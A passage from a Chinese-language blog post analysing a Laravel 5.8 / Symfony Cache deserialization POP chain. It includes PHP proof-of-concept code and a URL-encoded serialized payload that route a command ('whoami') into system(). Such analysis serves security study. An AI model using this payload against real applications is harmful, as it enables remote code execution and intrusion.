+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不满足，直接返回<code>false</code>，所以必须满足该条件。</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/7.png" alt="7"></p>
+<p>这里需要<code>Symfony\Component\Cache\CacheItem</code>类的三个属性，分别为<code>expiry</code>，<code>poolHash</code>和<code>innerItem</code>，<code>defaultLifetime</code>不需要，只要<code>null === $item[&quot;\0*\0expiry&quot;]</code>不满足即可。我们的目标是进入第234行的if，因为<code>$innerItem</code>是后面需要执行的命令的参数，所以必须对它进行一个赋值，对其进行赋值也简单，满足<code>$item[&quot;\0*\0poolHash&quot;] === $this-&gt;poolHash</code>和<code>$item[&quot;\0*\0innerItem&quot;]</code>不为空，前者因为<code>Symfony\Component\Cache\AdapterProxyAdapter</code>类的<code>poolHash</code>方法是可控的，所以可以实现。</p>
+<p>现在就还有最后一个问题，因为这里的动态函数调用<code>($this-&gt;setInnerItem)($innerItem, $item);</code>是支持双参数的，所以我们可以选择一些双参的参数。可以用<code>system</code>函数来执行一些命令，这个函数也是支持双参的，第2个参数是可选的，用来保存返回的执行状态：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/8.png" alt="8"></p>
+<p>poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">expiry</span>;</span><br><span class="line">        <span class="keyword">protected</span> $poolHash;</span><br><span class="line">        <span class="keyword">protected</span> $innerItem;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($expiry, $poolHash, $command)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;expiry = $expiry;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;innerItem = $command;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ProxyAdapter</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">poolHash</span>;</span><br><span class="line">        <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poolHash, $func)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setInnerItem = $func;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TagAwareAdapter</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">deferred</span>;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred, $pool)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = $deferred;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $cacheItem = new Symfony\Component\Cache\CacheItem(1, 1, 'whoami');</span><br><span class="line">    $proxyAdapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="number">1</span>, <span class="string">'system'</span>);</span><br><span class="line">    $tagAwareAdapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($cacheItem), $proxyAdapter);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($tagAwareAdapter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A47%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A57%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">00</span>deferred%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CCacheItem%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>expiry%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>poolHash%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>innerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>whoami%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A53%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">00</span>pool%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A54%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">00</span>poolHash%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A58%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">00</span>setInnerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>执行效果：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/9.png" alt="9"></p>
+<p>调用链：</p>
+<p><img src="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/imgs/10.png" alt="10"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/">https://bantttian.github.io/2020/06/02/Laravel-5-8-POP-Chain-Analysis-2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/laravel/"># laravel</a>
+                    
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># 反序列化</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/06/04/CVE-2018-18753-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">CVE-2018-18753 Typecho反序列化漏洞分析</a>
+            
+            
+            <a class="next" rel="next" href="/2020/06/02/Laravel-5-8-POP-Chain-Analysis-1/">Laravel 5.8框架POP链分析-上</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
